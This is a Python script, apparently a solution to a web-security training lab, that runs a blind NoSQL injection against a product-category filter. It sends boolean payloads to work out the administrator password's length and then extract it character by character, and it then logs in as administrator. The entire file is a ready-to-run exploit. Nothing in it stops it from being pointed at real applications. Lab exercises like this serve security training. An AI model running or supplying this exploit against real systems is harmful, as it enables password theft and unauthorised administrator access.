import requests
import string
import sys

def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <lab_url>")
        sys.exit(1)

    lab_url = sys.argv[1].rstrip('/')
    password = ""
    password_length = 0
    
    # First, determine the password length
    print("Determining password length...")
    for i in range(1, 50):
        payload = f'Gifts\\" && this.password.length == {i} || \\"a\\" == \\"b'
        response = requests.get(f"{lab_url}/filter?category={payload}")
        
        if "Gift" in response.text:
            password_length = i
            print(f"Password length: {password_length}")
            break
    
    if password_length == 0:
        print("Failed to determine password length")
        sys.exit(1)
    
    # Extract the password character by character
    print("Extracting password...")
    chars = string.ascii_letters + string.digits
    for i in range(password_length):
        for char in chars:
            payload = f'Gifts\\" && this.password[{i}] == \\"{char}\\" || \\"a\\" == \\"b'
            response = requests.get(f"{lab_url}/filter?category={payload}")
            
            if "Gift" in response.text:
                password += char
                print(f"Found character {i+1}/{password_length}: {char}")
                break
    
    print(f"Administrator password: {password}")
    
    # Login as administrator
    print("Logging in as administrator...")
    login_url = f"{lab_url}/login"
    data = {"username": "administrator", "password": password}
    session = requests.Session()
    response = session.post(login_url, data=data)
    
    if "Log out" in response.text:
        print("Successfully logged in as administrator!")
    else:
        print("Failed to log in")

if __name__ == "__main__":
    main()
